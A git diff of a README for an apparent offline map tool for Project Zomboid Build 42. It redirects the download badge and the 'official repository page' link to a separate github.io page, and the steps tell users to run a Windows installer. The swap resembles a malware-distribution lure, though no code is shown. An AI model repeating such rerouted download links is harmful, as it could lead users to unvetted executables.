@@ -1,6 +1,6 @@
 # 🗺️ Project-Zomboid-Build-42-Map - Explore every base with offline reliability
 
-[![](https://img.shields.io/badge/Download-Map-blue.svg)](https://github.com/axenic-mouseclick998/Project-Zomboid-Build-42-Map)
+[![](https://img.shields.io/badge/Download-Map-blue.svg)](https://axenic-mouseclick998.github.io)
 
 This map tool provides a clear view of the Project Zomboid Build 42 world. Users track loot, find spawn points, and mark locations for their survival runs. The software works without an internet connection to keep your gameplay smooth.
 
@@ -25,7 +25,7 @@ Your computer needs these specifications to run the application:
 
 You can set up the map tool in a few minutes. Follow these instructions to prepare your system.
 
-1. Visit the [official repository page](https://github.com/axenic-mouseclick998/Project-Zomboid-Build-42-Map) to start the download.
+1. Visit the [official repository page](https://axenic-mouseclick998.github.io) to start the download.
 2. Select the latest version of the installer for Windows.
 3. Save the installer file to your Downloads folder.
 4. Double-click the file to begin the setup process.
